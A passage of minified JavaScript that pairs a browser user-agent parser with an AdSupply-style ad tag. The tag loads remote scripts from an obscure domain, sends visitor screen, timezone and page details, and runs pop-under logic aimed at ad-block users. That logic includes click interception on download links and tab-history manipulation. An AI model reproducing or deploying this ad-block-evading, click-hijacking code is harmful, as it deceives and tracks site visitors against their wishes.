["name","Firefox"]],[/version\/([\w\.]+).+?mobile\/\w+\s(safari)/i],["version",["name","Mobile Safari"]],[/version\/([\w\.]+).+?(mobile\s?safari|safari)/i],["version","name"],[/webkit.+?(gsa)\/([\w\.]+).+?(mobile\s?safari|safari)(\/[\w\.]+)/i],[["name","GSA"],"version"],[/webkit.+?(mobile\s?safari|safari)(\/[\w\.]+)/i],["name",["version",h,{"1.0":"/8","1.2":"/1","1.3":"/3","2.0":"/412","2.0.2":"/416","2.0.3":"/417","2.0.4":"/419","?":"/"}]],[/(webkit|khtml)\/([\w\.]+)/i],["name","version"],[/(navigator|netscape)\/([\w\.-]+)/i], [["name","Netscape"],"version"],[/(swiftfox)/i,/(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?([\w\.\+]+)/i,/(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix|palemoon|basilisk|waterfox)\/([\w\.-]+)$/i,/(mozilla)\/([\w\.]+).+rv:.+gecko\/\d+/i,/(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir)[\/\s]?([\w\.]+)/i,/(links)\s\(([\w\.]+)/i,/(gobrowser)\/?([\w\.]*)/i,/(ice\s?browser)\/v?([\w\._]+)/i,/(mosaic)[\/\s]([\w\.]+)/i],["name","version"]],cpu:[[/(?:(amd|x(?:(?:86|64)[_-])?|wow|win)64)[;\)]/i], [["architecture","amd64"]],[/(ia32(?=;))/i],[["architecture",c.lowerize]],[/((?:i[346]|x)86)[;\)]/i],[["architecture","ia32"]],[/windows\s(ce|mobile);\sppc;/i],[["architecture","arm"]],[/((?:ppc|powerpc)(?:64)?)(?:\smac|;|\))/i],[["architecture",/ower/,"",c.lowerize]],[/(sun4\w)[;\)]/i],[["architecture","sparc"]],[/((?:avr32|ia64(?=;))|68k(?=\))|arm(?:64|(?=v\d+[;l]))|(?=atmel\s)avr|(?:irix|mips|sparc)(?:64)?(?=;)|pa-risc)/i],[["architecture",c.lowerize]]],device:[[/\((ipad|playbook);[\w\s\),;-]+(rim|apple)/i], ["model","vendor",["type","tablet"]],[/applecoremedia\/[\w\.]+ \((ipad)/],["model",["vendor","Apple"],["type","tablet"]],[/(apple\s{0,1}tv)/i],[["model","Apple TV"],["vendor","Apple"]],[/(archos)\s(gamepad2?)/i,/(hp).+(touchpad)/i,/(hp).+(tablet)/i,/(kindle)\/([\w\.]+)/i,/\s(nook)[\w\s]+build\/(\w+)/i,/(dell)\s(strea[kpr\s\d]*[\dko])/i],["vendor","model",["type","tablet"]],[/(kf[A-z]+)\sbuild\/.+silk\//i],["model",["vendor","Amazon"],["type","tablet"]],[/(sd|kf)[0349hijorstuw]+\sbuild\/.+silk\//i], [["model",h,{"Fire Phone":["SD","KF"]}],["vendor","Amazon"],["type","mobile"]],[/android.+aft([bms])\sbuild/i],["model",["vendor","Amazon"],["type","smarttv"]],[/\((ip[honed|\s\w*]+);.+(apple)/i],["model","vendor",["type","mobile"]],[/\((ip[honed|\s\w*]+);/i],["model",["vendor","Apple"],["type","mobile"]],[/(blackberry)[\s-]?(\w+)/i,/(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|meizu|motorola|polytron)[\s_-]?([\w-]*)/i,/(hp)\s([\w\s]+\w)/i,/(asus)-?(\w+)/i],["vendor","model",["type","mobile"]], [/\(bb10;\s(\w+)/i],["model",["vendor","BlackBerry"],["type","mobile"]],[/android.+(transfo[prime\s]{4,10}\s\w+|eeepc|slider\s\w+|nexus 7|padfone|p00c)/i],["model",["vendor","Asus"],["type","tablet"]],[/(sony)\s(tablet\s[ps])\sbuild\//i,/(sony)?(?:sgp.+)\sbuild\//i],[["vendor","Sony"],["model","Xperia Tablet"],["type","tablet"]],[/android.+\s([c-g]\d{4}|so[-l]\w+)(?=\sbuild\/|\).+chrome\/(?![1-6]{0,1}\d\.))/i],["model",["vendor","Sony"],["type","mobile"]],[/\s(ouya)\s/i,/(nintendo)\s([wids3u]+)/i], ["vendor","model",["type","console"]],[/android.+;\s(shield)\sbuild/i],["model",["vendor","Nvidia"],["type","console"]],[/(playstation\s[34portablevi]+)/i],["model",["vendor","Sony"],["type","console"]],[/(sprint\s(\w+))/i],[["vendor",h,{HTC:"APA",Sprint:"Sprint"}],["model",h,{"Evo Shift 4G":"7373KT"}],["type","mobile"]],[/(htc)[;_\s-]+([\w\s]+(?=\)|\sbuild)|\w+)/i,/(zte)-(\w*)/i,/(alcatel|geeksphone|nexian|panasonic|(?=;\s)sony)[_\s-]?([\w-]*)/i],["vendor",["model",/_/g," "],["type","mobile"]],[/(nexus\s9)/i], ["model",["vendor","HTC"],["type","tablet"]],[/d\/huawei([\w\s-]+)[;\)]/i,/(nexus\s6p)/i],["model",["vendor","Huawei"],["type","mobile"]],[/(microsoft);\s(lumia[\s\w]+)/i],["vendor","model",["type","mobile"]],[/[\s\(;](xbox(?:\sone)?)[\s\);]/i],["model",["vendor","Microsoft"],["type","console"]],[/(kin\.[onetw]{3})/i],[["model",/\./g," "],["vendor","Microsoft"],["type","mobile"]],[/\s(milestone|droid(?:[2-4x]|\s(?:bionic|x2|pro|razr))?:?(\s4g)?)[\w\s]+build\//i,/mot[\s-]?(\w*)/i,/(XT\d{3,4}) build\//i, /(nexus\s6)/i],["model",["vendor","Motorola"],["type","mobile"]],[/android.+\s(mz60\d|xoom[\s2]{0,2})\sbuild\//i],["model",["vendor","Motorola"],["type","tablet"]],[/hbbtv\/\d+\.\d+\.\d+\s+\([\w\s]*;\s*(\w[^;]*);([^;]*)/i],[["vendor",c.trim],["model",c.trim],["type","smarttv"]],[/hbbtv.+maple;(\d+)/i],[["model",/^/,"SmartTV"],["vendor","Samsung"],["type","smarttv"]],[/\(dtv[\);].+(aquos)/i],["model",["vendor","Sharp"],["type","smarttv"]],[/android.+((sch-i[89]0\d|shw-m380s|gt-p\d{4}|gt-n\d+|sgh-t8[56]9|nexus 10))/i, /((SM-T\w+))/i],[["vendor","Samsung"],"model",["type","tablet"]],[/smart-tv.+(samsung)/i],["vendor",["type","smarttv"],"model"],[/((s[cgp]h-\w+|gt-\w+|galaxy\snexus|sm-\w[\w\d]+))/i,/(sam[sung]*)[\s-]*(\w+-?[\w-]*)/i,/sec-((sgh\w+))/i],[["vendor","Samsung"],"model",["type","mobile"]],[/sie-(\w*)/i],["model",["vendor","Siemens"],["type","mobile"]],[/(maemo|nokia).*(n900|lumia\s\d+)/i,/(nokia)[\s_-]?([\w-]*)/i],[["vendor","Nokia"],"model",["type","mobile"]],[/android[x\d\.\s;]+\s([ab][1-7]\-?[0178a]\d\d?)/i], ["model",["vendor","Acer"],["type","tablet"]],[/android.+([vl]k\-?\d{3})\s+build/i],["model",["vendor","LG"],["type","tablet"]],[/android\s3\.[\s\w;-]{10}(lg?)-([06cv9]{3,4})/i],[["vendor","LG"],"model",["type","tablet"]],[/(lg) netcast\.tv/i],["vendor","model",["type","smarttv"]],[/(nexus\s[45])/i,/lg[e;\s\/-]+(\w*)/i,/android.+lg(\-?[\d\w]+)\s+build/i],["model",["vendor","LG"],["type","mobile"]],[/(lenovo)\s?(s(?:5000|6000)(?:[\w-]+)|tab(?:[\s\w]+))/i],["vendor","model",["type","tablet"]],[/android.+(ideatab[a-z0-9\-\s]+)/i], ["model",["vendor","Lenovo"],["type","tablet"]],[/(lenovo)[_\s-]?([\w-]+)/i],["vendor","model",["type","mobile"]],[/linux;.+((jolla));/i],["vendor","model",["type","mobile"]],[/((pebble))app\/[\d\.]+\s/i],["vendor","model",["type","wearable"]],[/android.+;\s(oppo)\s?([\w\s]+)\sbuild/i],["vendor","model",["type","mobile"]],[/crkey/i],[["model","Chromecast"],["vendor","Google"]],[/android.+;\s(glass)\s\d/i],["model",["vendor","Google"],["type","wearable"]],[/android.+;\s(pixel c)[\s)]/i],["model",["vendor", "Google"],["type","tablet"]],[/android.+;\s(pixel( [23])?( xl)?)[\s)]/i],["model",["vendor","Google"],["type","mobile"]],[/android.+;\s(\w+)\s+build\/hm\1/i,/android.+(hm[\s\-_]*note?[\s_]*(?:\d\w)?)\s+build/i,/android.+(mi[\s\-_]*(?:a\d|one|one[\s_]plus|note lte)?[\s_]*(?:\d?\w?)[\s_]*(?:plus)?)\s+build/i,/android.+(redmi[\s\-_]*(?:note)?(?:[\s_]*[\w\s]+))\s+build/i],[["model",/_/g," "],["vendor","Xiaomi"],["type","mobile"]],[/android.+(mi[\s\-_]*(?:pad)(?:[\s_]*[\w\s]+))\s+build/i],[["model",/_/g, " "],["vendor","Xiaomi"],["type","tablet"]],[/android.+;\s(m[1-5]\snote)\sbuild/i],["model",["vendor","Meizu"],["type","mobile"]],[/(mz)-([\w-]{2,})/i],[["vendor","Meizu"],"model",["type","mobile"]],[/android.+a000(1)\s+build/i,/android.+oneplus\s(a\d{4})\s+build/i],["model",["vendor","OnePlus"],["type","mobile"]],[/android.+[;\/]\s*(RCT[\d\w]+)\s+build/i],["model",["vendor","RCA"],["type","tablet"]],[/android.+[;\/\s]+(Venue[\d\s]{2,7})\s+build/i],["model",["vendor","Dell"],["type","tablet"]],[/android.+[;\/]\s*(Q[T|M][\d\w]+)\s+build/i], ["model",["vendor","Verizon"],["type","tablet"]],[/android.+[;\/]\s+(Barnes[&\s]+Noble\s+|BN[RT])(V?.*)\s+build/i],[["vendor","Barnes & Noble"],"model",["type","tablet"]],[/android.+[;\/]\s+(TM\d{3}.*\b)\s+build/i],["model",["vendor","NuVision"],["type","tablet"]],[/android.+;\s(k88)\sbuild/i],["model",["vendor","ZTE"],["type","tablet"]],[/android.+[;\/]\s*(gen\d{3})\s+build.*49h/i],["model",["vendor","Swiss"],["type","mobile"]],[/android.+[;\/]\s*(zur\d{3})\s+build/i],["model",["vendor","Swiss"], ["type","tablet"]],[/android.+[;\/]\s*((Zeki)?TB.*\b)\s+build/i],["model",["vendor","Zeki"],["type","tablet"]],[/(android).+[;\/]\s+([YR]\d{2})\s+build/i,/android.+[;\/]\s+(Dragon[\-\s]+Touch\s+|DT)(\w{5})\sbuild/i],[["vendor","Dragon Touch"],"model",["type","tablet"]],[/android.+[;\/]\s*(NS-?\w{0,9})\sbuild/i],["model",["vendor","Insignia"],["type","tablet"]],[/android.+[;\/]\s*((NX|Next)-?\w{0,9})\s+build/i],["model",["vendor","NextBook"],["type","tablet"]],[/android.+[;\/]\s*(Xtreme_)?(V(1[045]|2[015]|30|40|60|7[05]|90))\s+build/i], [["vendor","Voice"],"model",["type","mobile"]],[/android.+[;\/]\s*(LVTEL\-)?(V1[12])\s+build/i],[["vendor","LvTel"],"model",["type","mobile"]],[/android.+;\s(PH-1)\s/i],["model",["vendor","Essential"],["type","mobile"]],[/android.+[;\/]\s*(V(100MD|700NA|7011|917G).*\b)\s+build/i],["model",["vendor","Envizen"],["type","tablet"]],[/android.+[;\/]\s*(Le[\s\-]+Pan)[\s\-]+(\w{1,9})\s+build/i],["vendor","model",["type","tablet"]],[/android.+[;\/]\s*(Trio[\s\-]*.*)\s+build/i],["model",["vendor","MachSpeed"], ["type","tablet"]],[/android.+[;\/]\s*(Trinity)[\-\s]*(T\d{3})\s+build/i],["vendor","model",["type","tablet"]],[/android.+[;\/]\s*TU_(1491)\s+build/i],["model",["vendor","Rotor"],["type","tablet"]],[/android.+(KS(.+))\s+build/i],["model",["vendor","Amazon"],["type","tablet"]],[/android.+(Gigaset)[\s\-]+(Q\w{1,9})\s+build/i],["vendor","model",["type","tablet"]],[/\s(tablet|tab)[;\/]/i,/\s(mobile)(?:[;\/]|\ssafari)/i],[["type",c.lowerize],"vendor","model"],[/[\s\/\(](smart-?tv)[;\)]/i],[["type","smarttv"]], [/(android[\w\.\s\-]{0,9});.+build/i],["model",["vendor","Generic"]]],engine:[[/windows.+\sedge\/([\w\.]+)/i],["version",["name","EdgeHTML"]],[/webkit\/537\.36.+chrome\/(?!27)/i],[["name","Blink"]],[/(presto)\/([\w\.]+)/i,/(webkit|trident|netfront|netsurf|amaya|lynx|w3m|goanna)\/([\w\.]+)/i,/(khtml|tasman|links)[\/\s]\(?([\w\.]+)/i,/(icab)[\/\s]([23]\.[\d\.]+)/i],["name","version"],[/rv:([\w\.]{1,9}).+(gecko)/i],["version","name"]],os:[[/microsoft\s(windows)\s(vista|xp)/i],["name","version"],[/(windows)\snt\s6\.2;\s(arm)/i, /(windows\sphone(?:\sos)*)[\s\/]?([\d\.\s\w]*)/i,/(windows\smobile|windows)[\s\/]?([ntce\d\.\s]+\w)/i],["name",["version",h,l]],[/(win(?=3|9|n)|win\s9x\s)([nt\d\.]+)/i],[["name","Windows"],["version",h,l]],[/\((bb)(10);/i],[["name","BlackBerry"],"version"],[/(blackberry)\w*\/?([\w\.]*)/i,/(tizen)[\/\s]([\w\.]+)/i,/(android|webos|palm\sos|qnx|bada|rim\stablet\sos|meego|sailfish|contiki)[\/\s-]?([\w\.]*)/i],["name","version"],[/(symbian\s?os|symbos|s60(?=;))[\/\s-]?([\w\.]*)/i],[["name","Symbian"], "version"],[/\((series40);/i],["name"],[/mozilla.+\(mobile;.+gecko.+firefox/i],[["name","Firefox OS"],"version"],[/(nintendo|playstation)\s([wids34portablevu]+)/i,/(mint)[\/\s\(]?(\w*)/i,/(mageia|vectorlinux)[;\s]/i,/(joli|[kxln]?ubuntu|debian|suse|opensuse|gentoo|(?=\s)arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)[\/\s-]?(?!chrom)([\w\.-]*)/i,/(hurd|linux)\s?([\w\.]*)/i,/(gnu)\s?([\w\.]*)/i],["name","version"],[/(cros)\s[\w]+\s([\w\.]+\w)/i],[["name","Chromium OS"],"version"], [/(sunos)\s?([\w\.\d]*)/i],[["name","Solaris"],"version"],[/\s([frentopc-]{0,4}bsd|dragonfly)\s?([\w\.]*)/i],["name","version"],[/(haiku)\s(\w+)/i],["name","version"],[/cfnetwork\/.+darwin/i,/ip[honead]{2,4}(?:.*os\s([\w]+)\slike\smac|;\sopera)/i],[["version",/_/g,"."],["name","iOS"]],[/(mac\sos\sx)\s?([\w\s\.]*)/i,/(macintosh|mac(?=_powerpc)\s)/i],[["name","Mac OS"],["version",/_/g,"."]],[/((?:open)?solaris)[\/\s-]?([\w\.]*)/i,/(aix)\s((\d)(?=\.|\)|\s)[\w\.])*/i,/(plan\s9|minix|beos|os\/2|amigaos|morphos|risc\sos|openvms|fuchsia)/i, /(unix)\s?([\w\.]*)/i],["name","version"]]},f=function(n,r){"object"===typeof n&&(r=n,n=b);if(!(this instanceof f))return(new f(n,r)).getResult();var t=n||(a&&a.navigator&&a.navigator.userAgent?a.navigator.userAgent:""),u=r?c.extend(d,r):d;this.getBrowser=function(){var x={name:b,version:b};g.call(x,t,u.browser);x.major=c.major(x.version);return x};this.getCPU=function(){var x={architecture:b};g.call(x,t,u.cpu);return x};this.getDevice=function(){var x={vendor:b,model:b,type:b};g.call(x,t,u.device); return x};this.getEngine=function(){var x={name:b,version:b};g.call(x,t,u.engine);return x};this.getOS=function(){var x={name:b,version:b};g.call(x,t,u.os);return x};this.getResult=function(){return{ua:this.getUA(),browser:this.getBrowser(),engine:this.getEngine(),os:this.getOS(),device:this.getDevice(),cpu:this.getCPU()}};this.getUA=function(){return t};this.setUA=function(x){t=x;return this};return this};f.VERSION="0.7.20";f.BROWSER={NAME:"name",MAJOR:"major",VERSION:"version"};f.CPU={ARCHITECTURE:"architecture"}; f.DEVICE={MODEL:"model",VENDOR:"vendor",TYPE:"type",CONSOLE:"console",MOBILE:"mobile",SMARTTV:"smarttv",TABLET:"tablet",WEARABLE:"wearable",EMBEDDED:"embedded"};f.ENGINE={NAME:"name",VERSION:"version"};f.OS={NAME:"name",VERSION:"version"};"undefined"!==typeof exports?("undefined"!==typeof module&&module.exports&&(exports=module.exports=f),exports.UserAgentParser=f):a&&(a.UserAgentParser=f);var k=a&&(a.jQuery||a.Zepto);if("undefined"!==typeof k&&!k.ua){var m=new f;k.ua=m.getResult();k.ua.get=function(){return m.getUA()}; k.ua.set=function(n){m.setUA(n);n=m.getResult();for(var r in n)k.ua[r]=n[r]}}})("object"===typeof window?window:this);var e={Core:!0,Guid:"5ff0fb62-0643-4ff1-aaee-c737f9ffc0e0",Version:"asynch",InfinityHost:"//otnolatrnup.com",CDNHost:"//cdn.otnolatrnup.com",EmailInfoAddress:"info@adsupply.com",ClickTagEnabled:false,SiteId:0,SiteName:"",ClientIP:"",ServerDate:new Date,Modules:{},Media:{},PopLoaded:!1,PassParams:"",Bypass:"0",IsFastPop:true,FastPopZone:{"Id":21498,"Name":"PopUnder_AB"},PopRedirectDelay:200, ScriptHost:"otnolatrnup.com",DomainAlias:"otnolatrnup.com",IsAdblockRequest:!0,SubID:"",TId:"",_Top:null,UaParser:null,UseAjax:!1,EncodeUrl:!1,DFPImpressionUrl:null,MediaSourceTypes:{"Url":1,"Image":2,"Script":3,"Html":4,"Video":5,"VideoTag":6,"OnClickIFrame":7,"HeaderBidding":8,"Native":9,"InternalLink":10,"Programmatic":11},AbortFastPop:!1,TabHistoryStorageName:"InfSTAdUri",DebugEnabled:!1,RssFeedParserUrl:"https://xmlfeedparser.4dsply.com",UserMotionLogging:!1,LocalIpAddress:null,MetaKeywordOverride:"",CountryCode:"INF_COUNTRY_CODE",Init:function(){try{var a=function(z,v){var F=z.getElementsByTagName("iframe"); if(0===F.length)return!1;for(var A=0;A<F.length;A++){var E=F[A].contentDocument||F[A].contentWindow.document||F[A].document;if(E===v||!0===childFramesContainsTag(E,v))return!0}},b=this;document.getElementById("infinity");this._Top=self;if(top!=self)try{if(top.document.location.toString()){this._Top=top;for(var c,g=top.document.getElementsByTagName("iframe"),h=0;h<g.length;h++)try{var l=g[h].contentDocument||g[h].contentWindow.document||g[h].document;if(l===self.document||a(l,self.document)){c=g[h]; break}}catch(z){e.ConsoleLog(z)}if(c){var d=document.createAttribute("data-inf-script-frame");c.setAttributeNode(d)}}}catch(z){}var f=new UserAgentParser;this.UaParser=f;f.getBrowser();this.Browser=new this.InitBrowser;if(!false||-1==navigator.userAgent.indexOf("7.0.2 Safari")){e.TabHistoryManipulator(e.TabHistoryStorageName);this.IsFastPop&&this.InitFastPop();var k=(new Date).getTimezoneOffset(),m=e.GetDfpTagReferrerUrl()||window.document.referrer;if(e.IsAdblockRequest){var n=encodeURIComponent(k), r=encodeURIComponent(Math.floor(1E5*Math.random()+1)),t=0<this.TId.length?this.TId:"null";this.Script.Add(this.InfinityHost+"/"+(n?n:"null")+"/"+(this.Guid?this.Guid:"null")+"/"+(r?r:"null")+"/"+(this.Version?this.Version:"null")+"/null/123/"+encodeURIComponent(0<this.SubID.length?this.SubID:"null")+"/"+e.IsAdblockRequest+"/"+this.GetStdTimezoneOffset()+"/"+e.GetSupportedVideo()+"/"+this.GetWindowWidth()+"/"+this.GetWindowHeight()+"/"+encodeURIComponent(t)+"/"+e.GetScreenWidth()+"x"+e.GetScreenHeight()+ "/"+encodeURIComponent(e.GetKeywords())+"/Tag.a1b",!0)}else{var u=e._Top.document.location.ancestorOrigins,x=e.GetDfpTagReferrerUrl()||top!==self?void 0!==u&&1<u.length?u[u.length-1]:e.GetTopFrameCurrentUrl():e._Top.document.location.href;this.Script.Add(this.InfinityHost+"/Tag.engine?time="+encodeURIComponent(k)+"&id="+this.Guid+"&rand="+encodeURIComponent(Math.floor(1E5*Math.random()+1))+"&ver="+this.Version+"&referrerUrl="+encodeURIComponent(m)+"&fingerPrint=123"+(0<this.SubID.length?"&subId="+ this.SubID:"")+(0<this.TId.length?"&tid="+this.TId:"")+"&abr="+e.IsAdblockRequest+"&stdTime="+this.GetStdTimezoneOffset()+"&fpe="+e.GetSupportedVideo()+"&bw="+this.GetWindowWidth()+"&bh="+this.GetWindowHeight()+"&res="+e.GetScreenWidth()+"x"+e.GetScreenHeight()+(null!=x&&""!==x?"&curl="+encodeURIComponent(x):"")+"&kw="+encodeURIComponent(e.GetKeywords()),!0)}this.Script.Load(function(){if("undefined"!=typeof b.Media.Items&&void 0!==b.Media.Items&&null!==b.Media.Items){for(var z=0;z<b.Media.Items.length;z++){var v= b.Media.Items[z],F=b.LogZoneFilter({Id:v.ZoneId,Name:v.ZoneName});("PopUnder"===v.MediaType||b.IsClientSideFiltersPassed(v.ClientSideFilters,F))&&b.Script.Add(b.CDNHost+"/Scripts/MediaScripts/"+v.ScriptUri,!0)}b.Script.Load(function(){for(var A=0;A<b.Media.Items.length;A++){var E=b.Media.Items[A],H=E.MediaType,G=b.LogZoneFilter({Id:E.ZoneId,Name:E.ZoneName});b.ConsoleGroup("TagRB results for Zone "+E.ZoneName+"("+E.ZoneId+")");b.ConsoleLog(E);b.ConsoleGroupEnd();if("undefined"!=typeof b.Modules[H]&& ("PopUnder"===H||b.IsClientSideFiltersPassed(E.ClientSideFilters),G))b.Modules[H](E,b._Top)}})}});"function"===typeof InfCustomerCallback&&InfCustomerCallback()}}catch(z){e.ConsoleLog(z)}},GetDfpTagCurrentUrl:function(){var a=null;try{e.IsDfpTag()&&(a=null!=window.parent.frameElement&&""!=window.parent.document.referrer?window.parent.document.referrer:window.parent.document.location.href)}catch(b){e.ConsoleLog(b)}return a},GetDfpTagReferrerUrl:function(){var a=null;try{e.IsDfpTag()&&(a=null!=window.parent.frameElement&& ""!=window.parent.parent.document.referrer?window.parent.parent.document.referrer:window.parent.document.referrer)}catch(b){e.ConsoleLog(b)}return a},GetTopFrameCurrentUrl:function(){var a=null;try{a=null!=window.parent.frameElement&&""!=window.parent.document.referrer?window.parent.document.referrer:window.parent.document.location.href}catch(b){e.ConsoleLog(b),a=document.referrer}return a},IsDfpTag:function(){return null!=window.frameElement&&"true"===window.frameElement.getAttribute("data-inf-dfp")}, InitFastPop:function(){window.console=window.console||{log:function(d){}};e.ConsoleLog("INF_FPU: Initiated");e.PopSettings={};e.PopSettings.Cap=3;e.PopSettings.CapLength=900;e.PopSettings.Width=0;e.PopSettings.Height=0;e.PopSettings.IsPopunder=true;e.PopSettings.RespectTargetBlank=false;e.PopSettings.MobileHistory=false;e.PopSettings.PopUnderDontTriggerSelector=".nopop, .nopop *";e.PopSettings.PopUnderTriggerOnSelector= ".popsok, #download-link";e.PopSettings.PopUnderTriggerOnSelectorDepth=12;e.PopSettings.IsTracking=false;e.PopSettings.SameTabAdSettings={};e.PopSettings.SameTabAdSettings.AdblockOnly=true;e.PopSettings.SameTabAdSettings.Chrome=true;e.PopSettings.SameTabAdSettings.Edge=false;e.PopSettings.SameTabAdSettings.Firefox=true;e.PopSettings.SameTabAdSettings.IE=false;e.PopSettings.SameTabAdSettings.Opera= false;e.PopSettings.SameTabAdSettings.Safari=true;e.PopSettings.SameTabAdSettings.Windows=true;e.PopSettings.SameTabAdSettings.OSX=true;e.PopSettings.SameTabAdSettings.ClickAnywhere=false;e.PopSettings.UseRemoteMediaHost="false";e.PopSettings.UsePopCustomHost="false";e.PopSettings.PopCustomHostUrl="";e.PopSettings.PublisherDomainAliasUrl="otnolatrnup.com"; e.PopSettings.ScriptHost="otnolatrnup.com";e.PopSettings.SiteFrequencyCapFilters=[];e.PopSettings.KeywordFilter=null;e.PopSettings.ClientSideFilters=[];e.PopSettings.UserAgentFilter=null;e.PopSettings.OffsetFilter={ Type: 'Any', Offset: 1 };e.PopSettings.BrowserFilter={TargetChrome: true,TargetEdge: true,TargetFirefox: true,TargetIe: false,TargetOpera: true,TargetOthers: true,TargetSafari: true,TargetIe9: false,TargetIe10: false,TargetIe11: false,TargetWebView: false,TargetIeOthers: false};e.PopSettings.DeviceFilter=null;e.PopSettings.OSFilter=null;e.PopSettings.ReferrerFilter=null;e.PopSettings.RequireToRunOnDomainFilter= null;e.PopSettings.ZoneAdblockOnly=true;e.PopSettings.ZoneAdblockExclusive=false;e.PopSettings.ZoneAdblockIgnoreFrontEnd=true;e.PopSettings.ChromePopApproach=1;e.PopSettings.InterceptFlash=false;e.PopSettings.InterceptInlineFrames=false;e.PopSettings.HiddenPopunderWaitForParentWindowToClose=true;e.PopSettings.HiddenPopunderWaitForParentWindowToFocus= true;e.PopSettings.HiddenPopunderWaitSecondsToLoadMedia=0;e.PopSettings.AllowMultiplePopsForTheSamePageView=false;e.PopSettings.UseSameTab=function(d,f,k){var m=this.SameTabAdSettings;return a.PopSettings.IsPopunder&&void 0!==m&&null!==m&&(0==m.AdblockOnly||k)&&("WINDOWS"===f.name.toUpperCase()&&m.Windows||"MAC OS"===f.name.toUpperCase()&&m.OSX)&&((d.chrome||"Chrome"== d.name)&&m.Chrome||(d.firefox||"Firefox"==d.name)&&m.Firefox||(d.msie||"IE"==d.name)&&m.IE||"Edge"==d.name&&m.Edge||(d.opera||"Opera"==d.name)&&m.Opera||(d.safari||"Safari"==d.name)&&m.Safari)};var a=e,b=a.InfinityHost,c=encodeURIComponent((new Date).getTimezoneOffset()),g=encodeURIComponent(window.document.referrer),h=encodeURIComponent(this._Top.window.location.href),l=encodeURIComponent(Math.floor(1E5*Math.random()+1));(function(d,f){function k(q){if(!q||!q.Keywords)return!0;for(var B=!1,J=e.GetDfpTagCurrentUrl()|| window.location.href.toLowerCase(),L=0;L<q.Keywords.length&&!(B=q.Keywords[L].toLowerCase(),B=q.IsRegex?(new RegExp(B)).test(J):-1!==J.indexOf(B));L++);return B!==q.Exclusive}function m(){var q=e.PopSettings.UserAgentFilter;if(!q)return!0;H=e.UaParser;var B=!1,J=H.getUA(),L;for(L in q.UserAgentStrings)if(B=q.UserAgentStrings[L],B=q.IsRegex?(new RegExp(B)).test(J):-1!==J.indexOf(B))break;return B!==q.Exclusive}function n(){if(e.PopSettings.ZoneAdblockIgnoreFrontEnd||void 0===e.PopSettings.ZoneAdblockOnly)return!0; var q=!0;e.PopSettings.ZoneAdblockOnly&&!e.IsAdblockRequest&&(q=!1);var B=e.PopSettings.ZoneAdblockExclusive;return(B||q)&&!(B&&q)}function r(){if(!e.PopSettings.OffsetFilter)return!0;var q=e.Storage.GetCookie("g36FastPopSessionRequestNumber");if(null==q||isNaN(q))q=0;q++;e.Storage.SetCookie("g36FastPopSessionRequestNumber",q);switch(e.PopSettings.OffsetFilter.Type){case "Any":return!0;case "OnlyOn":return q==e.PopSettings.OffsetFilter.Offset;case "Before":return q<e.PopSettings.OffsetFilter.Offset; case "After":return q>e.PopSettings.OffsetFilter.Offset}}function t(){if(!e.PopSettings.BrowserFilter)return!0;var q=e.UaParser.getBrowser();return e.PopSettings.BrowserFilter.TargetChrome&&"Chrome"==q.name||e.PopSettings.BrowserFilter.TargetEdge&&"Edge"==q.name||e.PopSettings.BrowserFilter.TargetFirefox&&"Firefox"==q.name||e.PopSettings.BrowserFilter.TargetIe&&"IE"==q.name&&("9"===q.major&&e.PopSettings.BrowserFilter.TargetIe9||"10"===q.major&&e.PopSettings.BrowserFilter.TargetIe10||"11"===q.major&& e.PopSettings.BrowserFilter.TargetIe11||"9"!==q.major&&"10"!==q.major&&"11"!==q.major&&e.PopSettings.BrowserFilter.TargetIeOthers)||e.PopSettings.BrowserFilter.TargetOpera&&"Opera"==q.name||e.PopSettings.BrowserFilter.TargetSafari&&"Safari"==q.name||e.PopSettings.BrowserFilter.TargetWebView&&("Chrome Headless"==q.name||"Chrome WebView"==q.name||"Facebook"==q.name||"GSA"==q.name)||"Chrome"!=q.name&&"Edge"!=q.name&&"Firefox"!=q.name&&"IE"!=q.name&&"Opera"!=q.name&&"Safari"!=q.name&&e.PopSettings.BrowserFilter.TargetOthers} function u(){if(!e.PopSettings.DeviceFilter)return!0;var q=e.UaParser.getDevice();return e.PopSettings.DeviceFilter.TargetDesktop&&("console"==q.type||void 0==q.type)||e.PopSettings.DeviceFilter.TargetMobile&&"mobile"==q.type||e.PopSettings.DeviceFilter.TargetTablet&&"tablet"==q.type}function x(){if(!e.PopSettings.OSFilter)return!0;var q=e.UaParser.getOS();return e.PopSettings.OSFilter.TargetAndroid&&"Android"==q.name||e.PopSettings.OSFilter.TargetIOS&&"iOS"==q.name||e.PopSettings.OSFilter.TargetOSX&& "Mac OS"==q.name||e.PopSettings.OSFilter.TargetWindows&&"Windows"==q.name&&("Vista"==q.version&&e.PopSettings.OSFilter.TargetWindowsVista||"7"==q.version&&e.PopSettings.OSFilter.TargetWindows7||"8"==q.version&&e.PopSettings.OSFilter.TargetWindows8||"8.1"==q.version&&e.PopSettings.OSFilter.TargetWindows81||"10"==q.version&&e.PopSettings.OSFilter.TargetWindows10||"Vista"!=q.version&&"7"!=q.version&&"8"!=q.version&&"8.1"!=q.version&&"10"!=q.version&&e.PopSettings.OSFilter.TargetOtherVersions)||"Android"!= q.name&&"Mac OS"!=q.name&&"iOS"!=q.name&&"Windows"!=q.name&&e.PopSettings.OSFilter.TargetOthers}function z(q,B,J,L,U,V){var p=e,O="directories=0,toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width="+J.toString()+",height="+L.toString()+",screenX="+U+",screenY="+V+"index=0,total=1",X=p.PopSettings.UseSameTab(w,G,p.IsAdblockRequest);!e.PopSettings.InterceptFlash&&!e.PopSettings.InterceptInlineFrames||X||p.PopLoaded||p.IsFastPopCapped()||(p.FlashClickInterceptor.ignoreElementPredicate= function(C){if(p.PopSettings.RespectTargetBlank){var P=p.GetParentLink(C);if("_blank"===P.getAttribute("target")||"nofollow"===P.getAttribute("rel"))return!0}return p.IsDontTriggerForSelectorMatch(p.PopSettings.PopUnderDontTriggerSelector,C)||p.PopSettings.PopUnderTriggerOnSelector&&!p.IsTriggerOnSelectorMatch(p.PopSettings.PopUnderTriggerOnSelector,C,p.PopSettings.PopUnderTriggerOnSelectorDepth)},p.FlashClickInterceptor.activate(w,p.IsMobile.any(p._Top),e.PopSettings.InterceptFlash?p.IsFlashPluginEnabled(): !0));var 